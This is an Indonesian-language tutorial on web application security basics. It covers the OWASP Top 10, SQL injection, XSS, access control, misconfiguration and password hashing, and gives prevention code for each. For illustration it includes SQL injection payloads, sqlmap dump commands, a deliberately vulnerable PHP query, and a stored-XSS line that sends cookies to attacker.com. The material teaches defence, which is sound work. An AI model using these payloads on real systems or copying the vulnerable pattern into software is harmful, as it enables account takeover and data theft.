# Web Application Security Basics

Hampir semua bisnis modern punya web application — dari website sederhana sampai aplikasi kompleks. Dan hampir semua web application punya kerentanan. OWASP mencatat bahwa **injeksi, broken authentication, dan misconfiguration** adalah tiga besar penyebab breach di web application.

---

## OWASP Top 10

**OWASP (Open Web Application Security Project)** adalah organisasi non-profit yang merilis daftar 10 kerentanan web paling kritis. Ini adalah referensi standar di industri.

OWASP Top 10 2021:

| Rank | Kerentanan |
|------|-----------|
| A01 | Broken Access Control |
| A02 | Cryptographic Failures |
| A03 | Injection |
| A04 | Insecure Design |
| A05 | Security Misconfiguration |
| A06 | Vulnerable and Outdated Components |
| A07 | Identification and Authentication Failures |
| A08 | Software and Data Integrity Failures |
| A09 | Security Logging and Monitoring Failures |
| A10 | Server-Side Request Forgery (SSRF) |

---

## 1. SQL Injection (SQLi)

SQL Injection adalah kerentanan di mana attacker menyisipkan kode SQL ke dalam input yang tidak divalidasi, memanipulasi query database.

### Contoh Vulnerable Code

```php
// PHP — SANGAT BERBAHAYA
$username = $_GET['username'];
$query = "SELECT * FROM users WHERE username = '$username'";
$result = mysqli_query($conn, $query);
```

### Cara Exploit

```
Input normal:  admin
Query:         SELECT * FROM users WHERE username = 'admin'

Input jahat:   ' OR '1'='1
Query:         SELECT * FROM users WHERE username = '' OR '1'='1'
Hasil:         Return SEMUA user — login tanpa password!

Input jahat:   admin'--
Query:         SELECT * FROM users WHERE username = 'admin'--'
Hasil:         Skip sisa query — login sebagai admin
```

### Dampak
- Bypass authentication
- Baca, ubah, hapus data di database
- Dalam kasus tertentu: eksekusi command di server

### Pencegahan

```php
// Gunakan Prepared Statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);

// Atau dengan PDO named parameters
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :user");
$stmt->execute(['user' => $username]);
```

### Testing dengan SQLMap

```bash
# Deteksi SQLi secara otomatis
sqlmap -u "http://target.com/login?user=admin" --dbs

# Dump tabel tertentu
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump
```

---

## 2. Cross-Site Scripting (XSS)

XSS terjadi ketika attacker menyisipkan script berbahaya ke halaman web yang kemudian dieksekusi di browser korban.

### Jenis XSS

**Reflected XSS** — script ada di URL, langsung dieksekusi:
```
http://target.com/search?q=<script>alert('XSS')</script>
```

**Stored XSS** — script tersimpan di database, dieksekusi setiap halaman dimuat:
```
# Input di kolom komentar:
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

**DOM-based XSS** — script memanipulasi DOM tanpa melewati server.

### Dampak
- Mencuri session cookie → account takeover
- Redirect ke halaman phishing
- Keylogging
- Defacement

### Pencegahan

```javascript
// Escape output sebelum ditampilkan ke HTML
function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

// Gunakan Content Security Policy (CSP)
// Di HTTP header:
Content-Security-Policy: default-src 'self'; script-src 'self'
```

---

## 3. Broken Access Control

Kerentanan di mana user bisa mengakses resource atau melakukan aksi yang seharusnya tidak diizinkan.

### Contoh

```
# IDOR (Insecure Direct Object Reference)
# URL profil kamu: /user/profile?id=1001
# Coba ganti jadi:  /user/profile?id=1002
# Kalau bisa lihat profil orang lain → IDOR

# Privilege escalation
# User biasa bisa akses /admin karena tidak ada pengecekan role

# Force browsing
# /dashboard/reports/confidential.pdf bisa diakses tanpa login
```

### Pencegahan

```python
# Selalu validasi authorization di server
def get_user_profile(request, user_id):
    # Cek apakah user yang request adalah pemilik profil
    if request.user.id != user_id and not request.user.is_admin:
        return HttpResponseForbidden("Access denied")
    
    user = User.objects.get(id=user_id)
    return render(request, 'profile.html', {'user': user})
```

---

## 4. Security Misconfiguration

Konfigurasi default atau tidak aman yang membuka celah keamanan.

### Contoh Umum

```bash
# Directory listing aktif
http://target.com/uploads/  → menampilkan semua file di direktori

# Error message terlalu verbose
# Stack trace PHP yang expose path file sistem, versi software, dll

# Default credentials tidak diganti
# phpMyAdmin: root tanpa password
# Router admin: admin:admin

# Unnecessary ports terbuka
nmap target.com
# 3306/tcp open  mysql  ← database expose ke internet!
# 27017/tcp open mongodb ← MongoDB tanpa auth!

# HTTP headers security tidak di-set
# Missing: X-Frame-Options, X-Content-Type-Options, CSP, HSTS
```

### Cek Security Headers

```bash
curl -I https://target.com

# Headers yang harus ada:
# Strict-Transport-Security: max-age=31536000
# X-Frame-Options: DENY
# X-Content-Type-Options: nosniff
# Content-Security-Policy: default-src 'self'
# Referrer-Policy: strict-origin-when-cross-origin
```

---

## 5. Insecure Authentication

### Masalah Umum

```
- Password lemah diizinkan (minim 6 karakter tanpa syarat)
- Tidak ada rate limiting → brute force mudah
- Session token yang predictable
- Session tidak di-invalidate saat logout
- Password disimpan plaintext di database
```

### Hashing Password yang Benar

```python
# JANGAN: simpan plaintext atau hash MD5/SHA1
password_hash = md5("password123")  # SALAH

# BENAR: gunakan bcrypt, argon2, atau PBKDF2
import bcrypt

# Hash password
password = b"password123"
salt = bcrypt.gensalt()
hashed = bcrypt.hashpw(password, salt)

# Verifikasi
bcrypt.checkpw(b"password123", hashed)  # True
bcrypt.checkpw(b"wrongpassword", hashed)  # False
```

---

## Burp Suite: Tools Utama Web Security Testing

Burp Suite adalah proxy yang memungkinkan kamu intercept, inspect, dan modify HTTP/HTTPS traffic.

```
Browser → Burp Proxy (127.0.0.1:8080) → Target Server

Fitur utama:
- Intercept: pause dan edit request/response
- Repeater: kirim ulang request dengan modifikasi
- Intruder: fuzzing dan brute force otomatis
- Scanner: (versi Pro) scan otomatis kerentanan
- Decoder: encode/decode berbagai format
```

Setup:
1. Download Burp Suite Community Edition (gratis): [portswigger.net/burp](https://portswigger.net/burp)
2. Set browser proxy ke `127.0.0.1:8080`
3. Install Burp CA certificate di browser

---

## Latihan Web Security

Platform terbaik untuk latihan:

- **OWASP WebGoat** — aplikasi sengaja vulnerable untuk latihan
- **DVWA (Damn Vulnerable Web Application)** — mudah di-setup lokal
- **HackTheBox** — mesin web yang realistis
- **PortSwigger Web Security Academy** — gratis, materi lengkap + lab interaktif

```bash
# Setup DVWA dengan Docker
docker pull vulnerables/web-dvwa
docker run -d -p 80:80 vulnerables/web-dvwa
# Buka: http://localhost/
# Login: admin/password
```

---

## Penutup

Web application security adalah bidang yang sangat luas — artikel ini hanya menyentuh permukaannya. Yang paling penting: **pahami cara kerja serangan sebelum belajar cara mencegahnya**.

Mulai dengan PortSwigger Web Security Academy — gratis, terstruktur, dan labs-nya sangat bagus untuk membangun pemahaman yang solid.
